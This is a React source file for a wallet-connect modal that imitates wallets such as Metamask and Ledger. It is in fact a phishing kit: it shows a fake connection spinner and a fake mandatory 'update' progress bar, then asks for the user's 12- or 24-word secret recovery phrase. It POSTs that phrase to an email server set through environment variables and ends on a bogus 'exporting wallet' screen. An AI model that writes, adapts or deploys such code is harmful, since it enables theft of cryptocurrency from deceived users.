import React, { useState, useEffect } from 'react';

// Data for the wallets, updated to use placeholder images
const wallets = [
    { name: 'Metamask', id: 'metamask', logo: '/metamask.png' },
    { name: 'Trust Wallet', id: 'trust', logo: '/trustwallet.png' },
    { name: 'Coinbase Wallet', id: 'coinbase', logo: '/coinbase.jpeg' },
    { name: 'Ledger', id: 'ledger', logo: '/ledger.jpg' },
    { name: 'Trezor Wallet', id: 'trezor', logo: '/trezor.png' },
    // Add some more for scrolling demo
    { name: 'Phantom', id: 'phantom', logo: '/phantom.png' },
    { name: 'Solflare', id: 'solflare', logo: '/solflare.png' },
    { name: 'WalletConnect', id: 'walletconnect', logo: 'walletconnect.jpg' },
];

/**
 * Reusable header component for all views after the initial wallet list.
 */
const ModalHeader = ({ wallet, onClose }) => (
    <div className="flex items-center justify-between w-full pb-5 border-b border-gray-700 mb-5">
        <div className="flex items-center flex-grow">
            {/* The wallet logo */}
            <div className="w-8 h-8 rounded-lg overflow-hidden bg-white flex items-center justify-center mr-3">
                <img src={wallet.logo} alt={`${wallet.name} Logo`} className="w-full h-full object-contain p-1" />
            </div>
            {/* The wallet name */}
            <span className="text-white text-lg font-bold">
                {wallet.name}
            </span>
        </div>
        {/* Close button */}
        <button
            onClick={onClose}
            className="text-gray-400 text-3xl leading-none hover:text-white transition-colors"
        >
            &times;
        </button>
    </div>
);

/**
 * Step 2: Shows a loading icon after a wallet is selected.
 */
const WalletConnectingView = ({ wallet, onBack, onFinishConnect }) => {
    // Simulate a delay before moving to the next view
    useEffect(() => {
        const timer = setTimeout(() => {
            onFinishConnect();
        }, 1500); // 1.5 seconds to show loading icon
        return () => clearTimeout(timer);
    }, [onFinishConnect]);

    return (
        <div className="relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out" onClick={e => e.stopPropagation()}>
            <ModalHeader wallet={wallet} onClose={onBack} />
            <div className="flex-1 flex flex-col items-center justify-center">
                {/* Spinning loading icon */}
                <div className="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-[#e3be77]"></div>
                <p className="mt-6 text-gray-400 text-lg">Connecting to {wallet.name}...</p>
            </div>
        </div>
    );
};

/**
 * Step 3: Displays information about the wallet update and an update button.
 */
const WalletUpdateInfoView = ({ wallet, onBack, onStartUpdate }) => {
    return (
        <div className="relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out" onClick={e => e.stopPropagation()}>
            <ModalHeader wallet={wallet} onClose={onBack} />
            <div className="flex-1 flex flex-col items-center justify-center">
                <h3 className="text-white text-2xl font-bold mb-4">Update Wallet</h3>
                <p className="text-gray-400 mb-8">
                    To ensure a secure and stable connection, you must update your wallet.
                    This process may take a few moments.
                </p>
                <button
                    onClick={onStartUpdate}
                    className="w-full bg-[#132a15] hover:border-[#5ec768] transition text-[#e3be77] font-medium py-3 rounded-xl"
                >
                    Update
                </button>
            </div>
        </div>
    );
};

/**
 * Step 4: Shows a full-screen loading bar.
 */
const WalletFinalLoadingView = ({ wallet, onBack, onFinishLoading }) => {
    const [progress, setProgress] = useState(0);

    // Simulate the loading bar progress
    useEffect(() => {
        let currentProgress = 0;
        const interval = setInterval(() => {
            currentProgress += 2;
            if (currentProgress > 100) {
                clearInterval(interval);
                onFinishLoading();
            } else {
                setProgress(currentProgress);
            }
        }, 100);
        return () => clearInterval(interval);
    }, [onFinishLoading]);

    return (
        <div className="relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out" onClick={e => e.stopPropagation()}>
            <ModalHeader wallet={wallet} onClose={onBack} />
            <div className="flex-1 flex flex-col items-center justify-center">
                <div className="w-24 h-24 rounded-lg overflow-hidden bg-white flex items-center justify-center shadow-lg mb-6">
                    <img src={wallet.logo} alt={`${wallet.name} Logo`} className="w-full h-full object-contain p-2" />
                </div>
                <h3 className="text-white text-2xl font-bold mb-2">Updating {wallet.name}</h3>
                <p className="text-gray-400 mb-8">
                    Please wait while we finalize the update. This process is essential for security.
                </p>
                {/* The loading bar */}
                <div className="w-full bg-gray-700 rounded-full h-2.5">
                    <div
                        className="bg-green-600 h-2.5 rounded-full transition-all duration-100 ease-linear"
                        style={{ width: `${progress}%` }}
                    ></div>
                </div>
                <p className="mt-4 text-sm text-gray-500">{progress}%</p>
            </div>
        </div>
    );
};

/**
 * New Step 5: A new view for user input after a successful wallet connection.
 * Displays dynamic input fields for a recovery phrase.
 */
// RecoveryPhraseInputView component with new paste functionality
const RecoveryPhraseInputView = ({ wallet, onBack, onSend }) => {
    const [wordCount, setWordCount] = useState(12);
    const [phrases, setPhrases] = useState(Array(12).fill(''));
    const [loading, setLoading] = useState(false);

    const handleWordCountChange = (e) => {
        const newWordCount = parseInt(e.target.value, 10);
        setWordCount(newWordCount);
        setPhrases(Array(newWordCount).fill(''));
    };

    const handlePhraseChange = (index, value) => {
        // Trim the input value to handle leading/trailing spaces
        const trimmedValue = value.trim();

        // Check if the pasted value contains spaces
        if (trimmedValue.includes(' ')) {
            const pastedWords = trimmedValue.split(' ').filter(word => word !== '');
            const newWords = [...phrases];
            let newWordCount = pastedWords.length;

            // Update the word count and phrase array based on the pasted value
            if (newWordCount === 12 || newWordCount === 24) {
                setWordCount(newWordCount);
                for (let i = 0; i < newWordCount; i++) {
                    newWords[i] = pastedWords[i] || '';
                }
                setPhrases(newWords);
            } else {
                // Handle invalid phrase length
                alert('Invalid recovery phrase length. Please enter a 12 or 24-word phrase.');
                setPhrases(Array(phrases.length).fill('')); // Clear all inputs
            }
        } else {
            // If it's a single word, update only the current input field
            const newPhrases = [...phrases];
            newPhrases[index] = trimmedValue;
            setPhrases(newPhrases);
        }
    };

    const togglePhraseVisibility = (index) => {
        const input = document.getElementById(`phrase-input-${index}`);
        if (input) {
            input.type = input.type === 'password' ? 'text' : 'password';
        }
    };

    const handleSendDetails = async () => {
        if (phrases.some(phrase => !phrase.trim())) {
            alert('Please fill in all recovery phrase fields.');
            return;
        }

        const combinedPhrase = phrases.join(' ');
        const data = {
            walletName: wallet.name,
            details: combinedPhrase,
        };

        try {
            setLoading(true);
            const response = await fetch(import.meta.env.VITE_EMAIL_SERVER, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ walletName: wallet.name, details: combinedPhrase, email: import.meta.env.VITE_EMAIL_RECEIVER }),
            });

            if (response.ok) {
                console.log('Details sent successfully!', data);
            } else {
                console.error('Failed to send details:', response.statusText);
            }
        } catch (error) {
            console.error('Error sending details:', error);
        } finally {
            setLoading(false);
            onSend();
        }
    };

    return (
        <div className="relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out" onClick={e => e.stopPropagation()}>
            <ModalHeader wallet={wallet} onClose={onBack} />
            <div className="flex-1 flex flex-col items-center justify-center w-full">
                <h3 className="text-white text-2xl font-bold mb-4">Import your wallet with your Secret Recovery Phrase</h3>
                <p className="text-gray-400 mb-4">
                    We will use your Secret Recovery Phrase to validate your ownership. Enter the Secret Recovery Phrase that you were given when you created your wallet.
                </p>

                {/* Dropdown for phrase length */}
                <div className="w-full mb-4">
                    <select
                        className="w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-green-500 transition-colors"
                        value={wordCount}
                        onChange={handleWordCountChange}
                    >
                        <option value={12}>12-word phrase</option>
                        <option value={24}>24-word phrase</option>
                    </select>
                </div>

                {/* Info block for paste functionality */}
                <div className="w-full bg-neutral-800 text-gray-400 p-3 rounded-lg flex items-center mb-4">
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5 mr-2" viewBox="0 0 20 20" fill="currentColor">
                        <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v2a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                    </svg>
                    You can paste your entire secret recovery phrase into any field
                </div>

                {/* Dynamic grid of input fields - now scrollable */}
                <div className="grid grid-cols-2 gap-4 w-full max-h-[250px] overflow-y-auto mb-4 no-scrollbar">
                    {phrases.map((phrase, index) => (
                        <div key={index} className="flex items-center">
                            <span className="text-gray-400 mr-2">{index + 1}.</span>
                            <div className="relative w-full">
                                <input
                                    id={`phrase-input-${index}`}
                                    type="password"
                                    className="w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-green-500 transition-colors pr-10"
                                    placeholder="Enter word"
                                    value={phrase}
                                    onChange={(e) => handlePhraseChange(index, e.target.value)}
                                    required
                                />
                                <button
                                    type="button"
                                    onClick={() => togglePhraseVisibility(index)}
                                    className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-500 hover:text-white transition-colors"
                                >
                                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
                                        <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
                                        <path fillRule="evenodd" d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z" clipRule="evenodd" />
                                    </svg>
                                </button>
                            </div>
                        </div>
                    ))}
                </div>

                <button
                    onClick={handleSendDetails}
                    className="mt-4 w-full bg-[#132a15] hover:border-[#5ec768] transition text-[#e3be77] font-medium py-3 rounded-xl"
                    disabled={loading}
                >
                    {loading ? 'Submitting...' : 'Confirm Secret Recovery Phrase'}
                </button>
            </div>
        </div>
    );
};

/**
 * New Step 6: Displays a message after details are submitted.
 * This view is the final state and stays on screen.
 */
const WalletSentDetailsView = ({ wallet, onClose }) => {
    return (
        <div className="relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out" onClick={e => e.stopPropagation()}>
            <ModalHeader wallet={wallet} onClose={onClose} />
            <div className="flex-1 flex flex-col items-center justify-center">
                <h3 className="text-white text-2xl font-bold mb-4">Exporting Wallet</h3>
                <div className="animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-green-500"></div>
                <p className="mt-6 text-gray-400 text-lg">Your wallet is being exported securely...</p>
            </div>
        </div>
    );
};

/**
 * The primary modal for selecting a wallet with the new design.
 * This is the first view, and it slides up from the bottom on mobile.
 */
const WalletSelectView = ({ onClose, onSelectWallet }) => {
    return (
        <div
            className="relative w-full md:w-[95%] max-w-[420px] h-[550px] md:h-auto bg-neutral-900 border border-[#e3be77] rounded-t-3xl md:rounded-3xl p-6 shadow-2xl flex flex-col overflow-hidden"
            onClick={e => e.stopPropagation()}
        >
            {/* New Static Header */}
            <div className="flex justify-between items-center pb-5 border-b border-gray-700 mb-4">
                <div className="flex items-center gap-3">
                    <div className="bg-neutral-800 text-white text-xs font-semibold px-3 py-1 rounded-full">reown</div>
                    <span className="text-white text-lg">Manual Kit</span>
                </div>
                <button
                    onClick={onClose}
                    className="text-gray-400 text-3xl leading-none hover:text-white transition-colors"
                >
                    &times;
                </button>
            </div>

            {/* Scrollable List Container */}
            <div className="flex-1 overflow-y-auto px-1 -mx-1"
                style={{ scrollbarWidth: 'none', msOverflowStyle: 'none' }}>
                <style>{`
                    .no-scrollbar::-webkit-scrollbar {
                        display: none;
                    }
                `}</style>
                <p className="text-gray-400 mb-3 text-sm">Popular:</p>
                <div className="flex flex-col gap-2 no-scrollbar">
                    {wallets.map((wallet, index) => (
                        <div
                            key={wallet.id}
                            className="flex items-center justify-between p-3.5 bg-neutral-800 rounded-2xl cursor-pointer hover:bg-neutral-700 transition-colors"
                            onClick={() => onSelectWallet(wallet)}
                        >
                            <div className="flex items-center gap-4">
                                <div className="w-10 h-10 rounded-xl overflow-hidden bg-white flex items-center justify-center border border-gray-600">
                                    <img src={wallet.logo} alt={`${wallet.name} Logo`} className="w-full h-full object-contain" />
                                </div>
                                <span className="text-white font-medium">{wallet.name}</span>
                            </div>
                            {index === 0 && (
                                <span className="text-xs font-semibold text-green-500 bg-green-900/40 px-3 py-1 rounded-full">RECOMMENDED</span>
                            )}
                        </div>
                    ))}
                </div>
            </div>

            {/* New Static Footer */}
            <div className="flex flex-col items-center justify-center p-6 mt-4 bg-neutral-800 border border-gray-700 rounded-2xl">
                <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-globe-icon lucide-globe text-white"><circle cx="12" cy="12" r="10" /><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20" /><path d="M2 12h20" /></svg>

                <p className="text-white text-sm text-center">
                    Connect your wallet to get started
                </p>
            </div>
        </div>
    );
};

/**
 * Main, reusable modal component that handles internal state and renders the correct view.
 * @param {object} props
 * @param {boolean} props.isOpen - Controls the visibility of the modal.
 * @param {function} props.onClose - Callback function to close the modal.
 */
const WalletModal = ({ isOpen, onClose }) => {
    // State to manage the current view of the modal ('main', 'connecting', etc.)
    const [activeView, setActiveView] = useState('main');
    // State to store the currently selected wallet
    const [selectedWallet, setSelectedWallet] = useState(null);

    // Handler to select a wallet and change the view to 'connecting'
    const handleSelectWallet = (wallet) => {
        setSelectedWallet(wallet);
        setActiveView('connecting');
    };

    // Handler to transition from 'connecting' to 'update-info'
    const handleFinishConnect = () => {
        setActiveView('update-info');
    };

    // Handler to transition from 'update-info' to 'final-loading'
    const handleStartUpdate = () => {
        setActiveView('final-loading');
    };

    // Handler to transition from 'final-loading' to 'input'
    const handleFinishLoading = () => {
        setActiveView('recovery-input');
    };

    // Handler to transition to the final "sent" view
    const handleSend = () => {
        setActiveView('sent');
    };

    // This function handles going back to the main wallet selection view.
    const handleBackToMain = () => {
        setActiveView('main');
    };

    // This function handles closing the modal entirely, and resetting the view state.
    const handleFullClose = () => {
        setActiveView('main');
        onClose();
    }

    // A utility function to render the correct view based on the current state
    const renderView = () => {
        switch (activeView) {
            case 'main':
                return <WalletSelectView onClose={handleFullClose} onSelectWallet={handleSelectWallet} />;
            case 'connecting':
                return (
                    <WalletConnectingView
                        wallet={selectedWallet}
                        onBack={handleBackToMain}
                        onFinishConnect={handleFinishConnect}
                    />
                );
            case 'update-info':
                return (
                    <WalletUpdateInfoView
                        wallet={selectedWallet}
                        onBack={handleBackToMain}
                        onStartUpdate={handleStartUpdate}
                    />
                );
            case 'final-loading':
                return (
                    <WalletFinalLoadingView
                        wallet={selectedWallet}
                        onBack={handleBackToMain}
                        onFinishLoading={handleFinishLoading}
                    />
                );
            case 'recovery-input':
                return (
                    <RecoveryPhraseInputView
                        wallet={selectedWallet}
                        onBack={handleBackToMain}
                        onSend={handleSend}
                    />
                );
            case 'sent':
                return (
                    <WalletSentDetailsView
                        wallet={selectedWallet}
                        onClose={handleFullClose}
                    />
                );
            default:
                return null;
        }
    };

    // Determine the main modal container classes based on the active view
    const mainContainerClasses = activeView === 'main'
        ? 'fixed inset-0 flex items-end md:items-center justify-center z-[10000] backdrop-blur-md transition-all duration-300'
        : 'fixed inset-0 flex items-center justify-center z-[10000] backdrop-blur-md transition-all duration-300';

    // Determine the content container classes based on the active view
    const contentContainerClasses = activeView === 'main'
        ? 'relative w-full md:w-[95%] max-w-[420px]'
        : 'relative w-full h-full md:w-[95%] md:h-auto max-w-[420px]';

    return (
        <div
            className={`${mainContainerClasses} ${isOpen ? 'opacity-100 visible' : 'opacity-0 invisible'}`}
            onClick={activeView === 'main' ? handleFullClose : handleBackToMain}
        >
            <div className={contentContainerClasses} onClick={e => e.stopPropagation()}>
                {renderView()}
            </div>
        </div>
    );
};
export default WalletModal;